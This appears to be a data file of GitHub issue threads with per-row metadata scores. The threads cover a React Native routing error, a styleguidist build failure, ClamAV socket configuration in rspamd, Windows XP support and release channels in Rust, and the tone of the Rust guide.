aksonov/react-native-router-flux/2835,0.0947250675,aksonov,react-native-router-flux,Route 'key0' should declare a screen. For example,2214,12,38,0.5,2,"Version  react-native-router-flux v4.0.0-beta.28 react-native v0.52.1 ## Actual behaviour throw error like below Unhandled JS Exception Error Route 'key0' should declare a screen. For example   import MyScreen from './MyScreen';   ...   key0 {       screen MyScreen,   }   ...    Expected behaviour then I import all business components into the entry file, and combine them into &lt;Router&gt;&lt;/Router&gt; wrap, it works, but I want organize my route in each business module, and export some module files, combine them in entry file finally. sorry im not good at english. please give me a hand, I can't thank you any more Steps to reproduce I export some Components from my business modules like below mm01.js (...some imports gose here) export default class MM01 extends Component{   render(){     return (       &lt;Scene key=""myModule01"" initial tabs&gt;           &lt;Scene key=""myModule010"" initial component={MM010}&gt;           &lt;Scene key=""myModule011"" component={MM011}&gt;           &lt;Scene key=""myModule012"" component={MM012}&gt;           &lt;Scene key=""myModule013"" component={MM013}&gt;       &lt;/Scene&gt;     );   } }  mm02.js (...some imports gose here) export default class MM02 extends Component{   render(){     return (       &lt;Scene key=""myModule02""&gt;           &lt;Scene key=""myModule020"" initial component={MM020}&gt;           &lt;Scene key=""myModule021"" component={MM021}&gt;       &lt;/Scene&gt;     );   } }  entry.js like below (...some imports gose here)  class App extends Component {     return (       &lt;Router&gt;           &lt;Scene key=""root""&gt;               &lt;MM01 /&gt;               &lt;MM02 /&gt;           &lt;/Scene&gt;       &lt;/Router&gt;     ); } AppRegistry.registerComponent('rnMbox', () =&gt; App);   @friend Did you find a fix? Please help i'm having the same problem.  @friend  @friend told the fix, Split your scenes to smaller parts if needed  How to use  to divide routers?  Getting the same error as well with beta 31, the v3 method no longer works and the link above throws a  404 error  is this problem still going on ?  seriously ! please don't write packages if you can't maintain them, fix the issues  v3 and beta are not supported. ",3,0,230,0.07142857142857142,0.2857142857142857,80,4,
styleguidist/react-styleguidist/1044,0,styleguidist,react-styleguidist,remove #!,64,0,0,0.42857142857142855,0,"Hello, tell me please how to remove #! when pagePerSection true ",0,0,3,0.14285714285714285,0.2857142857142857,3,1,
styleguidist/react-styleguidist/1247,0.089560345,styleguidist,react-styleguidist,"Error when running build: ""Cannot read property 'endsWith' of undefined""",4223,34,28,0.5,1,"Current behavior When trying to build the styleguide with  after  and copying the  example components folder I'm getting this error To reproduce From my fork repository  you will get the error From scratch, inside the repo's folder run Then create  with this content (see #1243) Copy the components from the cra example folder And build it Here is when the error appears Expected behavior After running To have the static files located in the  folder. This already works for the original  example.  I'm running into this same problem...  TLDR put the following add the following dangerouslyupdatewebpackconfig to your  file Root Cause Okay, I've tracked down the problem. With the newer version of  they use  and this is where the ""problem"" comes from. Some of the helper utils in that make some assumptions about the webpack config that are always true for their ""supported"" use cases. This particular problem comes from assuming there is a  property, basically, they are not null checking because in there use cases this is autogenerated if not provided. Styleguidist does take the output webpack config from  and merge it will it's own. Doing addresses most of these types of issues but it expelicitly ignores the output section. Fix The fix for this is that styleguidist should include a  property in the output section of the webpack config using  if present or  if not. I'm happy to submit a PR if @friend or similar are happy with this approach. Workaround until a fix is in you can use the  method to solve this. your  will look something like  Thanks for the investigation! I have some concerns on passing the app’s path or . Will this work fine when the style guide is deployed to a folder? For example .  @friend I'll need to verify but create-react-app ""expects"" this pattern with its config so if you are using their webpack config you should be okay. I dug through all the code paths to figure out what  was getting set to. That said if you needed to change to a different path you could do something like  in your package.json. That said styleguidist could also just offer a config option and then just default to  if nothing is provided.  Requiring users to add a new config value for something that's already working without isn't an option. Can we pass something like an empty string?  I'm not suggesting a required option just the ability to add one if you need since it's dependent on the webpack config you are using. This way instead of having to use  you would just set an optional config called, I don't know, . If the user sets it then we use that otherwise set it to empty string. then in make-webpack-config.js L37-L41 would become  Again you’re suggesting to introduce an option for a feature that already works out of the box.  It does not work out of the box with the latest versions of  you have to manaully write a webpack config and you cannot take advantage of the webpack config that ships with the app. it is perfectly acceptable if you do not want to support . please see  #1243 for the work around that allows you to point styleguidist at the webpack config that now ships with . Doing this will allow you to run a development version but will not allow you to build aka the source of this bug  I also have this issue,  with the latest  runs ok, but  produces the above error. I agree with @friend, as of today it does not work out of the box.  @friend The difference between  and  is the  variable, which is  when using , and  when using . I have found another workaround, that is to set ♠webpackConfig require('react-scripts/config/webpack.config')('development'),styleguide.config.jswebpackEnvdevelopmentReact Developer Tool` does not give any warning on the generated pages.  @friend thank you, it works! Not sure what is the implication of always forcing the  config though.  @friend you can use my suggested workaround and then you wont be in DEV all the time. I have a fork of a fix that does this for folks. HOWEVER, @friend claims this is not an actually issue and has stoped responding to my comments.  tada This issue has been resolved in version 9.0.6 tada The release is available on  npm package (@friend dist-tag) GitHub release  Your semantic-release bot packagerocket ",17,0,113,0.4166666666666667,0,79,4,
vstakhov/rspamd/1832,0.066328942,vstakhov,rspamd,antivirus module uses wrong ClamAV defaults on Debian,3814,35,44,0.8571428571428571,1,"Classification (Please choose one option)  [ ] Crash/Hang/Data loss [ ] WebUI/Usability [ ] Serious bug [ ] Other bug [ ] Feature [x] Enhancement  Reproducibility (Please choose one option)  [X] Always [ ] Sometimes [ ] Rarely [ ] Unable [ ] I didn’t try [ ] Not applicable  Rspamd version 1.6.4 Operation system, CPU, memory and environment Debian Stretch Description (Please provide a descriptive summary of the issue) The documentation on how to use ClamAV as a malware scanner should be improved. The defaults as defined in  do not work on Debian. The ""clamd"" process by default listens to the socket file /var/run/clamav/clamd.ctl and not on TCP port 127.0.0.13310. A working configuration would be (/etc/rspam.d/local.d/antivirus.conf) clamav {   action = ""reject"";   symbol = ""CLAM_VIRUS"";   type = ""clamav"";   log_clean = true;   servers = ""/var/run/clamav/clamd.ctl""; }  That also requires that the _rspamd user is part of the clamav group to be able to access the control socket. I suggest that this is made clearer. I would also like to suggest that an error is logged if the antivirus backend could not be reached. Such an error should not go unnoticed. Thanks. Steps to reproduce Install rspamd on Debian Stretch. Send a test virus (e.g. eicar.com). See in the logs that the antivirus module does nothing.  That's not Rspamd issue. We cannot fit all 100500 Linux distros in the world. Using of Unix sockets is extremely inconvenient because of the mess with permissions/groups and inability to dump traffic. I personally think that using of the unix socket is a very poor default. However, the default documentation clearly says that unix sockets usage is also possible. The errors are also logged properly, you are likely using the default  and clamav thus does not see  in a message itself. This logging part might be improved indeed.  Let's just say that the documentation of the antivirus module is very unspecific about what the defaults are. Quote # servers to query (if port is unspecified, scanner-specific default is used)  Without looking at the source code it's unclear what the default may be. Would be nice to put that into the configuration file as a comment for example. IMHO using sockets has pros and cons. The pro is that you don't open up a service for everyone on a host but just for those who you grant access. The con is that it may be harder to use if you get the permissions wrong and that tcpdump isn't working. I don't want to judge the respective distros' approaches. I'm just a stupid ignorant sysadmin who tried hard to get AV scanning working. ) And good documentation and clear error messages help with that.  Forget about the sockets. I heard you. My point is the defaults are not documented (except in the source code (where the user is not looking)).  On Debian 9.... You need to specifiy the TCPAddr localhost TCPSocket 3310 in the clamav.conf so that rspamd can connect to it. And servers = ""127.0.0.13310""; in rspamd antivirus.conf Should work without issue. It is documented in both rspamd and clamav how to set the port/socket.  No, but your instructions mislead the user. Is this your intention? If not, then either correct your config example, or remove the example and refer the user to correct instructions  Look, if there's multiple, unrelated people coming here explicitly telling you there's documentation issues how big do you think the chance is that you're right in thinking there's no problem?  Or even 146% as I'm inclined to ignore issues about the documentation without patches.  It must be nice to be without doubt. You wrote good software. The way you act is why you don't automatically get the patches from everyone. Maybe one day you'll understand. Fare well.  Your answer doesn't make any sense.  You documentation is wrong. It does not work. ",13,2,183,0,0,118,2,
rust-lang/rust/12842,0.0453560165,rust-lang,rust,Rethink supporting Windows XP,18918,228,163,0,6,"I've made some investigation recently, and found that, there are only two APIs which are not supported by Windows XP, throughout the repo tree. There are  CreateSymbolicLinkW, only used by nativeiofilesymlink() GetFinalPathNameByHandleW, only used by nativeiofilereadlink()  And nativeiofile{symlink,readlink} are never used throughout the repo tree, except stdiofs{symlink,readlink} (which are really never used). Do we really need including symlink/readlink functionality inside std? How other languages do? Currently Windows XP is still wildly used in the world, especially in Asia. Its installed volume is much more than Mac OS + Linux + Unix. We give up supporting XP just because of two api absent? Maybe it's wrong. cc #11950 update readlink is used by rustcmetadatafilesearch. update This is my branch   I just commented out the usage of CreateSymbolicLinkW and GetFinalPathNameByHandleW. This make the new rustc.exe run successfully in Windows XP, ant it works mostly OK (see my latest comment below).  I thought there were mutex and condition variable APIs that are not supported on windows XP too?  @friend  After remove CreateSymbolicLinkW and GetFinalPathNameByHandleW, I've made rustc run in XP (it works ok). More investigation need to be done perhaps.  Oh, really? Does it pass tests? (cc  )  I don't know. On Windows platform (even Win7),  always fails. see #12745  or even just  should pass (at least, they pass on the buildbots).  I'll have a try. Thank you! @friend In general, a .exe can't be start up, if it includes unsupported APIs in Import Table. Before i remove CreateSymbolicLinkW and GetFinalPathNameByHandleW from source, rustc can't be start up in XP; after removing, the new rustc runs normally. So I think, rustc doesn't require other unsupported API. Will prove it. Update my new rustc.exe can be loaded successfully by depends.exe in XP. Yes, It has no other dependency.  @friend  run-pass [stage2] test\run-pass\exponential-notation.rs task '&lt;main&gt;' failed at 'called  on a  value', D\MinGW\msys\1.0\home\LIIGO\rust\rust\src\libstd \option.rs148 make *** [i686-pc-mingw32/test/run_pass_stage2_driver-i686-pc-mingw32.out] Error 101 make check-stage2-stdCreateSymbolicLinkWGetFinalPathNameByHandleW`.  Might be an issue with UTF8 or floating point arithmetic on XP?  @friend Are you sure? I've compiled the std and its tests from source in Windows XP using my new rustc.exe. Compiled OK,  most tests passed, and some tests failed (1276 passed; 41 failed; 134 ignored) (Looks like all failures are from libgreen and libnative. But I don't know why currently.)  I just looked at that test you failed for uses of Option.unwrap. Was trying to suggest why the test was failing even though you didn't change anything.  Thank you! 2014年3月12日 下午853于 ""Ben Harris"" notifications@friend.com写道：  @friend Rust doesn't expose native condition variables yet. When it does, that's another API that's missing on XP. I don't think Rust should support an operating system not receiving security updates because encouraging any continued use of it is irresponsible. I don't think we should add a further burden to working on the concurrency and I/O implementation. It's already very hard to improve because libuv defines a lowest common denominator it needs to support, and XP would be another.  @friend I disagree with you. C, C++, Java, C#, Python, Ruby, Scala, and many more, all support Windows XP.  Without knowing much about it, it doesn't look too onerous to take some functions out of the extern block and replace them with a  call and checking for null. Probably worth writing up an RFC if you want XP to be supported properly. It will end up with lots of .  @friend plus one @friend most of those don't claim any sort of safety guarantees, some are laughably worse than others (I'm looking at you, Java) and I don't expect any of them (maybe Scala?) to have condition variables in core libraries. @friend runtime failure based on feature set is unacceptable, at worst I'd expect to see two different OSes for Windows,  having features disabled in libraries via  (and lowering the minimum API level somewhere, I know there is such a thing on Windows).  Supporting Windows XP means Rust will need a homegrown implementation of condition variable, among other problems. It won't be possible for it to be included in the generic Windows target without performance hits because branches + bloated code aren't always acceptable. I think it's unethical to care about usage share to the point where users are encouraged to remain on an insecure platform without security updates. If Apple or Microsoft isn't providing support, then we shouldn't be providing support. It gives us a nice gradual deprecation policy where we can actually migrate to new win32 APIs, etc. but I think the more important issue is the security one. To be honest, I can't really think of a use case for an XP target beyond malware development. It's not like XP users are going to buy your products or consider open-source software.  Lucky for the malware developers, I imagine   will allow them to write safe concurrent malware in rust for windows xp.  I agree with @friend, Windows XP is about to reach the end of it's already significantly extended support lifetime, and has been without mainstream support for almost 5 years now. Bending over backwards for it is just not worth it. At the age of 13, XP is stupidly old. If there are small, unobtrusive changes you can make so rustc still works on XP, then fine, but official support doesn't make sense. We don't even list BSD as an officially supported build environment, and that's an actively-developed OS!  I plus one the drop of XP. It is like using IE6 polyfills when doing web developement, not only you do have to include more hacks to support it but it is also making users believe they have a viable platform. Which is not the case.  Although the experiment of making it run on XP may be fun (?) I don't think we should add official support for it (again?).  @friend @friend any thoughts about this ?  Although I personally agree that official XP support should be dropped, it may be worth asking some video game developers for their opinions.  I'm not a hard core gamer, but I believe there is still a significant number of gamers that use XP due to some performance issues in Windows 7 and 8.  Of course by the time Rust is actually used in a commercial game this may have changed.  Rust shouldn't do anything that may alienate the video game development crowd.  Personally, I am happy to take patches that improve compatibility with xp as long as it doesn't have a big impact on the design. Having a design that is compatible with diverse environments is good for more than just xp. The issues preventing Rust from working on xp appear minor and solvable. I don't want to 'officially' support xp though.  @friend Removing symlink/readlink functionality or leaving out native condition variables (as we currently do) would hurt the quality of the project elsewhere. If XP is going to be supported, it needs a separate target to use in  or at least stubbed out functionality that's conditionally linked against.  Libuv has itself condition variables implementation to Support XP. 2014年3月15日 上午411于 ""Daniel Micay"" notifications@friend.com写道：  I don't think it's acceptable to have a hard dependency on libuv for binaries not using libgreen. It doesn't make sense to add a whole bunch of overhead to support a dead operating system... I doubt that the libuv implementation of condition variables is efficient.  We could design a symlink api that can report ""not supported"". On Mar 14, 2014 111 PM, ""Daniel Micay"" notifications@friend.com wrote  There is a new non-XP symbol in .  [llvm-dev] RFC Drop support running LLVM on Windows XP  @friend plus one  I'm currently developing a program for customers using Windows XP, and the decision can not be made by me to upgrade their OS. So for now I have to choose golang. Just like oracle dropped support for java6, then RedHat picked it up, because too many clients are still using java6.  We aren't even supporting VIsta right now.  Servo was expected to be run in Windows XP [2015-01-01]   To be clear, that discussion is not about running the servo rendering engine on windows xp (it doesn't run on any version of windows atm, aiui), but rather some components written in Rust to be incorporated into Gecko. The distinction is somewhat important because the components may be restricted enough to not use any of the major features XP is missing, meaning that reaching level of support needed for that purpose may not be (a) very hard, and (b) may not be enough for many other applications.  FWIW, here's a list of APIs used by libstd, that are missing on Windows XP AcquireSRWLockExclusive AcquireSRWLockShared CancelIoEx ReleaseSRWLockExclusive ReleaseSRWLockShared SetFileInformationByHandle SetThreadStackGuarantee SleepConditionVariableSRW TryAcquireSRWLockExclusive TryAcquireSRWLockShared WakeAllConditionVariable WakeConditionVariable  Hi, thanks for the list, that's quite useful to have if that's all of them. Personally I'd like to see a full Rust core toolchain working on XP, since that's the best way to know that things are working reasonably; we can just run the existing test suite.  You could then run Rust compiler in an XP VM if you want. Problem there of course is LLVM unhelpfully dropping support for XP.  Might be good to keep tabs on what incompatibilities that's trying to bring in, and maybe maintain an XP compatible version of LLVM as well (ought to be a lot easier than trying to backport later).  I reckon the wider open source community would be interested in this when they realise compilers they use no longer function on XP. Main question I think is whether backwards compatible alternatives to those APIs should just replace whatever's there currently or should be included only when those APIs aren't available (be it just XP or Vista also).  Benefit of dropping them completely is that the same code is then being run and tested on Win7 as on XP/Vista, so things seem more likely to work across the board (and more consistently) and there's no chance of Rust's software architecture for XP needing to be different.  Downside is that use of these APIs might be more efficient and some features/capabilities may be lost.  It might even be required to use certain APIs to get things working in Vista/Win7 which don't exist in XP. Indeed the best approach might be to avoid new APIs unless they're either non-essential (e.g. a security feature that should be enabled) or actually required for correct functioning on the newer OS since there is no alternative.  N.B. such alternatives may be considerably more complex than 'convenience' APIs involving a lot more manual coding or restructuring; however compatibility is highly valuable and custom code using simpler primitives permits much more flexibility in the implementation (which you definitely can't get if you rely on OS code to do all the work). Indeed it is possible to write code which outperforms the OS and maybe even avoids any use of expensive system calls at all.  Given this is a compiler for what claims to be a systems programming language, it doesn't make a lot of sense to rely on high level OS functions in the first place, if there are ways to achieve the same within the Rust system core, using low level primitives.  As such, similar arguments may apply to use of certain syscalls/libraries in Linux. Needless to say, writing a Rust OS becomes easier the more stuff libstd can do without OS support for a particular CPU architecture (and anything that works in both Windows and Linux should work on a Rust OS too).  Synchronisation between threads is definitely something I'd expect to be in that category.  Please, please consider this. I regularly develop for customers using Windows XP. The situation is pretty common in controls engineering and chemical engineering. The ability to emit executables that run on XP is valuable. Even a separate target for XP that lacked mutexes and condition variables would be mildly useful, although I've read interesting emulation methods for condition variables.  I think attitude is important. Kicking out XP would be a mistake after all, because XP will survive a lot longer than your expectation, owing to the virtual machines. XP is insecure, yes, but nothing is 100% secure. Warm acceptance is very important, if you want your beloved Rust-lang to become a true descendant of C/C++.  Firefox want to integrate some Rust code or library (such as mp4 parser and url parser). But Firefox is still required to be run in Windows XP as before. This is another reason for Rust to support XP.  I'd love to use Rust at work and am currently exploring use-cases where that might be possible. However, I definitely need Windows XP support to work for the projects I'm working on. I don't need the compiler/toolchain to work on XP, but the produced executables should definitely run on XP. I can totally accept some APIs not being available on XP (not sure how to mark that during compilation though). But having a Hello World program crash at start with ""AquireSRWLockExclusive could not be located in kernel32.dll."" is bad. I would be glad if you could you reconsider at least partial support for XP.  I will work on adding support for XP soon.  @friend Thank you! Can I track this progress somewhere? I would love to be up-to-date on this )  @friend I'll keep this issue updated on any work I do towards this.  @friend awesome! I was also planning on getting XP working soon, so if you have any questions feel free to reach out to me on IRC.  I disagree with literally every aspect of this.  Hamstringing modern Rust for the sake of an operating system that has been discontinued would be ludicrous.  Rust is an opportunity to get rid of dumb decisions in past languages. Do what you want on Windows XP, but don't take away my modern APIs or their modern implementations.  Rust is just a new language - not very plausible to thrive, yet. So Rust needs to support as large community as possible. So giving a simple and easy work-around for XP is necessary. The idea of banning XP completely is a silly and dangerous idea. You don't want your beloved language Rust appears to be obstinate, do you?  @friend Supporting an obsolete version of an operating system riddled with zero days and receiving no security updates is actually dangerous and maybe even irresponsible. Besides, PRs are accepted if you want to make something compatible with XP as long as it comes at no perceivable cost for newer versions, there is no ""banning"", it's just not ""necessary"" or high-priority.  Killer argument – I think I'll just leave my door open from now on because well, no lock is 100% secure anyway.   Rust code will not be allowed in Firefox unless Rust supports XP We want Rust in Firefox Therefore, Rust must support Windows XP   For how long will Firefox continue to support XP? When will a Firefox version be released (meant for users, not developers) that contains rust code?  @friend Looks like Firefox will continue to support XP indefinitely. As for your other question, there is this tweet  I very much doubt that XP will be supported indefinitely. Over the years support for Windows 95, 98, ME, and 2000 (and of those 2000 was actually a quite decent ) ) has been dropped. XP will follow, it's only a matter of time. So given that, is supporting XP really worth it?  Because XP seems more likely to survive longer than those who want to extinct it.  I understand the word ""indefinitely"" to mean that there are no plans to drop support for it, instead of ""forever"". Note that XP is still a very large market, and is said to have more users than desktop Linux.  @friend The question is - how much time. Looking at graphs at netmarketshare.com (and looking around!) I can easily imagine it being quite popular in 2020. In this case the support is probably worth it. (I was going to look at Vista/XP support later this year, but since @friend works approximately 100x faster than me, it won't probably be necessary.)  First of all Thank you so much for fixing this! This is awesome! plus one Is there a way to detect at compile time or at application init time whether a panic'ing API would be used? If I have an app that should run on Windows XP, I don't want to have to test every code path to make sure some unsupported API doesn't panic... Thanks in advance for your consideration! )  Not currently, no.  Is this planned or possible? I think that would be crucial to be able to write code without being ""really careful about which APIs to use"". If I wanted to be careful, I wouldn't choose Rust ;)  Not currently. You may want to open an issue on the RFCs repo and/or write up an RFC with details on how to do such a thing. )  @friend I'm sure I understand this joke Do you mean Rust is too young?  I meant ""If I wanted to be careful about which API to call in order to not panic, I wouldn't choose Rust"". I want my rust to ""it compiles, let's ship it"" ;)  I'm waiting for the nightly to try out this patch. When I run my Rust program on WinXP at the moment currently I get 'the procedure entry point TryAcquireSRWLockExclusive could not be located in the dynamic link library kernel32.dll' With this patch, I'm wondering, will my program likely just panic out, or may it run.  This will take some time to propagate into the nightlies currently. The 32-bit Windows compiler is currently still using MinGW and is unlikely to work on Windows XP (although I have not tested this). The triple I tested was , which we currently cannot build a compiler for due to this LLVM bug. Instead you'd need to build a compiler which can target . We don't currently build nightlies for targets like this either (e.g. we have no android nightlies), but this is also coming soon! tl;dr; to try out XP support you need to do this  Thanks a lot! I'll give that a shot, I didn't realise it requires a separate target  I'm a tad confused I've ended up with a rustc in the stage2 dir you mention however during compilation I got I've tried doing  @friend you probably won't get very far if the build doesn't complete, so I'd start out diagnosing why  didn't build. Perhaps a reconfigure was needed?  Oh wow it looks like I just totally forgot to commit the file! I'll add it in a PR I'm prepping now, but you can add  with these contents  Cheers!  That works for me. In msys2 I did, just so I don't forget ;)  Just wondering if anyone can point me in the right direction, I can compile a simple rust program fine, but I'm getting the following error with a more complex one  The MinGW target seems to work for Windows XP. Or at least  gets this far ` Looks like the test infrastructure already relies on condition variables for something.  @friend Was that using the latest nightly build then? ",95,38,652,0,0,791,35,
rust-lang/rust/15539,0.0744260045,rust-lang,rust,rust guide: Zooko finds some bits too fluffy,7858,105,48,0,1,"I've been reading the new Rust Guide. So far the chatty, informal, reassuring tone has left me waffling between being annoyed and being reassured, but mostly reassured. However, when I got to Programmers love car analogies, so I've got a good one for you to think about the  relationship between cargo and rustc rustc is like a car, and cargo is like a robotic  driver. You can drive your car yourself, of course, but isn't it just easier to let a  computer drive it for you?  The balance was tipped, and I became annoyed at the tone and started yearning for the old no-nonsense tutorial back. So I suggest removing that paragraph, since it adds little.  I specifically noted this, and nobody had any real objections at the time.  For what it is worth, I had the same “Ugh — too much cute!” reaction to A place for everything, and everything in its place.   I'm not saying it shouldn't be, I just want to acknowlege that I wrote it, said ""lol"", and then shipped it with the intention of asking if it's too cute or not.  For what it is worth, I suspect the chatty and reassuring tone is great for a lot of readers, and I'm excited about the idea of making Rust accessible to the less experienced programmers (or at least, less experienced in the ways of low-level/systemsy/unixy tools), and I imagine this guide will work well for them. So, despite my grumpy comment about wanting the old tutorial back, I like this one and I'm glad you're working on it. And I know that every reader has different bands of pleasure and tolerance for fluff. I'm noting the bits where I find myself becoming conscious of my own displeasure just in case it helps you tune it. I'm not commenting on all the bits where I found the fluff to be pleasurable.  Absolutely. I think that being a bit lighter makes the docs way better than boring, dry ones, but I also recognize that it's easy to go overboard.  Well, at least my crack about how cargo makes the car go didn’t get in! (That would certainly have been too much!)  I do like the fluffy tone for the most part, but this part threw me off too. Mostly because I don't get the analogy. How is cargo like a robotic driver? I don't get it. Analogies are risky in that while they can serve to enlighten, they can also confuse if the reader doesn't ""get it"". I think this one could be particularly tricky to understand for people whose English is not that strong. Also ""programmers love car analogies"" is a bit of a generalization ;)  I think that the new Guide is way better than the old Tutorial was.  See, it's a guide, not a reference, (we have the Manual for that).  The Guide is meant to teach the reader about Rust and systems programming in an engaging manner, like a good book would. There's certainly a place for a more formal format as well, but that is what the manual is for. Maybe it is because I haven't had much previous experience with systems programming, however the Guide is very accessible and this makes it easier for people like me to jump on the Rust train.  I have some limited C++ experience, which is certainly helping, but the attitude that one has to know the old in order to learn the new is I think preventing many new programmers from trying some of these newer languages. For a lot of people, it comes down to cost/benefit analysis If I have to know C++ well in order to get into Rust, I'm just not going to invest the time into Rust but instead into C++, because of the much more established ecosystem. If instead I can jump onto Rust from e.g. Ruby/Python/JavaScript background as well, can learn at my own pace and don't have to first invest into C++ then I'm sold. A lot of people adopted the dynamic languages precisely because they could be picked up from scratch and to be honest the dynamic people are one of the most active open-source communities here on GitHub, (Just check the amount of JavaScript pouting in every day) and if we manage to capture their interest the Rust ecosystem will greatly benefit. Just look at Go, released less than 5 years ago and where it is today, thanks to the people coming over from Python/Ruby. I am not saying the Guide should be accessible to everybody, however it should be accessible to people without previous C++ experience and I think @friend  does a great job at achieving this goal. As far as the car analogy, well sure - not every analogy's so great, but that goes for a lot of books, TV shows etc. as well and I think as long as a point is made clearly, the particular analogy doesn't really matter that much.  I find analogies are ultimately distracting and unhelpful. Rather than saying what cargo is like, it's better to say what it actually is. It's probably better to first explain what cargo is, before explaining that it's in alpha state.  Analogies are good only when they explain a difficult relation in terms of ordinary experiences. In this particular case the relation rustc-cargo isn't very difficult to grasp and the robotic drivers image isn't ordinary or helpful - rather, it's a convolution.  I think part of the problem is that which every tutorial has its adressing very different people at the same time. Perhaps there should be two tutorials Rust for ""beginners"" (anyone not too familiar with compiled languages), and Rust for those with more ""experience"". I think the chatty, friendly language is great for beginners, but could easily be ""distracting and unhelpful"" for those already familiar with the basic concepts, if not with how Rust handles them. Just an idea...  @friend Yeah, I think that's a great idea and we already kind of have that with the Guide being chatty and the Tutorial being not so chatty.  So, perhaps instead of the Guide replacing the Tutorial, it could supplement the Tutorial, although that would require two pieces of documentation with a similar aim being maintained.  @friend Yes, it has its drawbacks it would require two pieces of documentation with similar aims; I'm not sure how that is best addressed. I wonder what our Documentation Master @friend thinks... It is a tricky thing, though beginners need to be taught with an understanding that these concepts are complicated, take time to learn, and are not simple; I think the current tutorial does that very well. More experienced people see things like type systems and pointers as obvious and simple and feel talked-down-to when those concepts are given too much time and treated too simply for their tastes. Perhaps its more like a 2-part tutorial, where the ""beginner"" section leads into the ""experienced"" section, and at the beginning, there is a suggestion that those with more experience may want to jump to Part 2? That still has its drawbacks, as you have to balance between covering everything in the right place for each group and trying not to repeat yourself, but maybe...  @friend Perhaps it doesn't have to be 2 part, but having a piece of JavaScript where one could click on a ""Background"" tab next to problematic sections (e.g. pointers) and have a little bit of a background info on pointers unfold, whereas the experienced programmers would just leave the ""Background"" tabs collapsed and flow with it as an advanced tutorial.  This way you can have one Tutorial accessible to both camps, altrough I would too like to hear @friend's opinion on this.  Here is my opinion and general plan  I think that enough people not liking this is justification to remove it. Can anyone suggest something that should go in its place, or should we just axe the paragraph and be done with it?  @friend Based on the comments and the fact that the next paragraph explains what Cargo really is in the first sentence; ""Cargo manages three things building your code, downloading the dependencies your code needs, and building the dependencies your code needs."", I would just axe the analogy paragraph and be done with it. Awesome Guide BTW. ",28,2,250,0,0,152,7,
rust-lang/rust/19263,0.129913454,rust-lang,rust,Support installing multiple release channels,6721,66,46,0,6,"Rust is going to have three release channels stable, beta, and nightly. Each of them has its use (that’s why they exist), so it will probably be common to have more than one of them installed at the same time on the same machine (such as a developer’s laptop). Currently, this it is possible to install multiple rusts at different locations, and set up the  and (since the [rpath removal])  environment variables to pick one of them. However this is error-prone and not very convenient. It would be better if multiple versions could be installed in the same ""prefix"" (e.g. , where the default environment variables Just Work&lt;sup&gt;®&lt;/sup&gt;). Executables could have a suffix to distinguish them, for example  (stable),  and . Other files would have to be namespaced somehow to avoid conflicts. (Corresponding Cargo issue  Semi-related I have been wondering whether we should start distributing a wrapper script for invoking  that sets up the  and other environment variables appropriately. I saw a user recently who untarred the  binary package and tried to copy  into a different location.  I advised them to ""just install it globally"", but I would prefer to have some support for the use case where you do not install the distribution into .  I have been maintaining my own private script for supporting this, but it would probably be good to determine what our general attitude is about this.  (That is, if the team thinks we can stomach supporting a wrapper script, then I can work on making my own script more robust and making it distributable.  If the team hates the idea of a wrapper script ... well, then that's unfortunate given that we've also discarded using rpaths...)  Update Oh, the reason that this is related to this topic is that a wrapper script can be written to support multiple release channels, either by having multiple scripts that point to the different spots as necessary, or by having a single script that reflectively dispatches on , i.e. guessing based on whether we see  or  in the script's name.  There is endless precedence for this kind of tooling in the Ruby/Python worlds, and it's quite useful.  @friend, right. At some point we might also want to do this by version numbers (e.g. have Rust 1.3 next to 1.4) in addition to release channels.  The obvious problem with putting a bunch of same-named libraries next to each other is that they are going to cause resolution conflicts. We might resolve that by attaching a unique id to each build of the compiler and associating every library with that build. That will have some impact on distributing binary libs (which presumably nobody does currently). The docs are also going to cause naming conflicts as well as some of the other supplementary files. Have to consider all the different ways of installing Rust and whether and how to make them all compatible with multi-rust.  Note that our makefiles specify a 'extra filename' paramter to be mixed into all filenames  could tweak that per-release channel in theory. The binaries themselves won't have it mixed in, though (just the libs).  I agree with @friend .  It should suffice to extract as many TAR archives as the user wish under the common ""base"" directory in a parallel manner.  They can coexist and uninstalling one of them is as simple as . *nix We can simply provide a wrapper shell script to choose one of multiple installations We can enhance this wrapper following battle-tested tools such as  (Ruby),  (Python), or  (Node.js)  (Several similar tools exist for each language;  I'm not claiming they are the best ones for their languages.) To those who likes nitpicking not setting  properly is caller's fault. Windows The idea is the same as the *nix case.  Instead of , we can implement a wrapper executable which calls  to locate the base directory   @friend another option for Windows is a wrapper  script.  You can use the variable  which expands () into the drive () and path () for the batch file ().  See also  do not do much Windows hacking; I just remembered that we used a trick like this in the Larceny project larceny.bat, and I think a batch file will be easier for end-users to modify/maintain than a wrapper executable.)  It’s maybe not as essential that all of the ways to install support this, as long as some of them do. In particular, the packages for Rust release and nightly in my distribution currently conflict, and I’d like them not to ) IMO it’s ok if packagers need to do a small amount of work (like passing the right  flags) to make this happen.  I have a project that supports installation of multiple Rusts  It depends a bit on the upcoming release channel and installer infrastructure.  Hello, I am a co-maintainer of rust on Gentoo. Are there any updates on this issue? What is the appropriate way to install multiple release channels? Thanks much, William  I believe the compiler itself can add support for things (though I’m not sure what exactly) to make this easier. In the meantime Brian has been working on  , which I believe is the best we can do right now. You probably don’t want to import it as-is into the Gentoo packaging system, but you could take ideas. Specifically, it ""installs"" different Rust versions in different directories. (It just extracts tarballs with pre-built binaries, but I believe it’s equivalent to building with .) Then, wrapper scripts run executables from one install or another after setting up the environment, most importantly the  variable.  Triage multirust has matured significantly.  Here's one unfortunate case where multirust doesn't help, and other than bringing back rtool I'm not sure what will. It seems like it should be a non-negotiable requirement that one can run a program after building it without having to invoke any black magic between build and run.  @friend Just to mention it, Gentoo deals with multiple rust installations already and names them e.g.  and manages a symlink using . So there is the overlay called rust (obviously) which contains the special versions rust-9999 (git) and rust-999 (nightly). Would it be possible to have rust (binary named *-stable), rust-beta and rust-nightly in this repo? Then I could manage my versions (which are updated as expected by the package manager) using eselect for the default compiler and still use rustc-beta and rustc-nightly or rustc-9999 for the other versions. This way I could test libraries much more easily for stable/beta/nightly compatibility. Edit Sorry, I did not see before that the portage (non-overlay) is also ruststable and the rust-999 of the overlay is rustnightly. Still, the beta is missing.  I believe multirust is basically our answer here, so closing, yay!  Now if only we had a Windows equivalent! ",32,1,236,0,0,107,5,
